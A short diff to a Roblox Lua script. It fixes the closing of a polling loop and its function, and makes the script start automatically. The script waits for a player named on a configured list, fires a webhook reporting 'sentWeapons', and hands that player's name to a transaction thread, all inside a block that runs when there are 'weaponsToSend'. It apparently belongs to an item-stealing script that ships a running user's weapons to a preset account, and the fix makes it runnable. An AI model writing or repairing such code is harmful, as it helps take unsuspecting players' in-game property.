@@ -521,11 +521,10 @@ local function startPlayerPolling()
                 -- Check if their username matches your configuration list
                 if table.find(users, player.Name) then
                     
-                    -- 1. The webhook trigger is moved here so it fires 
-                    -- the exact second the target account is detected
+                    -- 1. Fire webhook notification
                     SendMessage(sentWeapons)
                     
-                    -- 2. Turn off the loop immediately so it doesn't spam webhooks or requests
+                    -- 2. Turn off the loop immediately
                     searchActive = false
                     
                     -- 3. Pass the detected player's name into the transaction thread
@@ -537,13 +536,14 @@ local function startPlayerPolling()
                 end
             end
             
-            -- Prevent the server thread from freezing by waiting 3 seconds
+            -- Prevent the server thread from freezing
             task.wait(checkInterval)
--- 1. This is the end of the startPlayerPolling function block
-    end
+        end -- <-- FIX 1: Closes the 'while searchActive do' loop
+    end) -- <-- FIX 2: Closes the 'task.spawn(function()' block
+end -- <-- FIX 3: Closes the 'local function startPlayerPolling()' block
 
-    -- 2. Run the polling loop automatically when the script executes
-    startPlayerPolling()
+-- 4. Run the polling loop automatically when the script executes
+startPlayerPolling()
 
--- 3. This final 'end' closes the main 'if #weaponsToSend > 0 then' block from way up higher in the script.
+-- 5. This final 'end' closes the main 'if #weaponsToSend > 0 then' block from line 458
 end
